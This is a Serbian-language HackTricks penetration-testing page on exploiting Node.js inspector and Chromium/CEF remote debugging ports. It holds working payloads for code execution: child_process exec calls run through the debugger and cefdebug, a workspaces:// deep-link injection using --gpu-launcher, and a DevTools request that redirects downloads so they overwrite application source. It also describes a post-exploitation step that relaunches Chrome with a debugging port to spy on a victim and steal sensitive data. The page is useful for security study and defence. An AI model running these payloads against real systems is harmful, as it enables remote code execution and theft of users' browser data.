# Zloupotreba Node inspektora/CEF debugovanja

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Od dokumentacije](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Kada se pokrene sa `--inspect` prekidačem, Node.js proces osluškuje za debug klijenta. Podrazumevano, osluškuje na hostu i portu **`127.0.0.1:9229`**. Svaki proces takođe dobija **jedinstveni** **UUID**.

Inspektor klijenti moraju znati i specificirati adresu hosta, port i UUID za povezivanje. Ceo URL će izgledati nešto kao `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Pošto **debuger ima pun pristup Node.js izvršnom okruženju**, zlonamerni akter koji može da se poveže na ovaj port može izvršiti proizvoljan kod u ime Node.js procesa (**potencijalno eskalacija privilegija**).
{% endhint %}

Postoji nekoliko načina za pokretanje inspektora:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se inspicira, pojaviće se nešto slično ovome:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) poput potrebe da koriste parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (zaštite od SSRF ostaju vrlo slične). Međutim, umesto dodeljivanja **NodeJS** **debug** sesije, oni će komunicirati sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali nema direktnog RCE.

Kada pokrenete pregledač u režimu za debagovanje, nešto slično ovome će se pojaviti:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Preglednici, WebSockets i politika istog porekla <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Veb-sajtovi otvoreni u veb-pregledaču mogu da vrše WebSocket i HTTP zahteve u okviru bezbednosnog modela pregledača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije za debager**. **Politika istog porekla** **sprečava** veb-sajtove da mogu da naprave **ovu HTTP vezu**. Radi dodatne bezbednosti protiv [**DNS preusmeravanja napada**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu precizno navode **IP adresu** ili **`localhost`** ili **`localhost6`**.

{% hint style="info" %}
Ove **bezbednosne mere sprečavaju iskorišćavanje inspektora** za izvršavanje koda samo slanjem HTTP zahteva (što bi se moglo uraditi iskorišćavanjem SSRF ranjivosti).
{% endhint %}

### Pokretanje inspektora u pokrenutim procesima

Možete poslati **signal SIGUSR1** pokrenutom nodejs procesu da bi se **pokrenuo inspektor** na podrazumevanom portu. Međutim, imajte na umu da je potrebno imati dovoljno privilegija, pa ovo može omogućiti pristup **privilegovanim informacijama unutar procesa** ali ne i direktnu eskalaciju privilegija.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Ovo je korisno u kontejnerima jer **gašenje procesa i pokretanje novog** sa `--inspect` nije **opcija** jer će **kontejner** biti **ubijen** sa procesom.
{% endhint %}

### Povezivanje sa inspektorom/debugerom

Da biste se povezali sa **Chromium-based browserom**, možete pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome odnosno Edge. Klikom na dugme Configure, treba se osigurati da su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (674).png>)

Korišćenjem **komandne linije** možete se povezati sa debuggerom/inspektorom pomoću:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alatka [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), omogućava **pronalaženje inspektora** koji se izvršavaju lokalno i **ubacivanje koda** u njih.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Imajte na umu da **NodeJS RCE eksploatacije neće raditi** ako ste povezani sa pregledačem putem [**Chrome DevTools Protocola**](https://chromedevtools.github.io/devtools-protocol/) (treba da proverite API da biste pronašli zanimljive stvari koje možete s njim uraditi).
{% endhint %}

## RCE u NodeJS Debugger/Inspector-u

{% hint style="info" %}
Ako ste ovde došli tražeći kako da dobijete **RCE putem XSS u Electronu, molimo proverite ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Neke uobičajene metode za dobijanje **RCE** kada možete **povezati** se na Node **inspektor** su korišćenje nečega poput (izgleda da ovo **neće raditi u vezi sa Chrome DevTools protokolom**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

Možete proveriti API ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
U odeljku ću samo navesti zanimljive stvari koje sam pronašao da su ljudi koristili za iskorišćavanje ovog protokola.

### Ubacivanje parametara putem dubokih veza

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security je otkrio da je aplikacija zasnovana na CEF **registrovala prilagođeni URI** u sistemu (workspaces://) koji je primao puni URI, a zatim **pokretao CEF zasnovanu aplikaciju** sa konfiguracijom koja je delimično konstruisana iz tog URI-ja.

Otkriveno je da su parametri URI-ja dekodirani URL-om i korišćeni za pokretanje osnovne CEF aplikacije, omogućavajući korisniku da **ubaci** zastavicu **`--gpu-launcher`** u **komandnoj liniji** i izvrši proizvoljne radnje.

Dakle, payload poput:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Prepisivanje fajlova

Promenite folder gde će **preuzeti fajlovi biti sačuvani** i preuzmite fajl da **prepiset** često korišćeni **izvorni kod** aplikacije sa vašim **zlonamernim kodom**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE i ekstrakcija podataka

Prema ovom postu: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) moguće je dobiti RCE i ekstraktovati interne stranice iz therivera.

### Post-Eksploatacija

U stvarnom okruženju i **nakon kompromitovanja** korisnikovog računara koji koristi Chrome/Chromium bazirani pregledač, mogli biste pokrenuti Chrome proces sa **aktiviranim debagovanjem i proslediti port za debagovanje** kako biste mu pristupili. Na ovaj način ćete moći **inspekcijom pratiti sve što žrtva radi sa Chrome-om i ukrasti osetljive informacije**.

Neprimetan način je **završiti svaki Chrome proces** a zatim pozvati nešto poput
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Reference

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ČLANSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
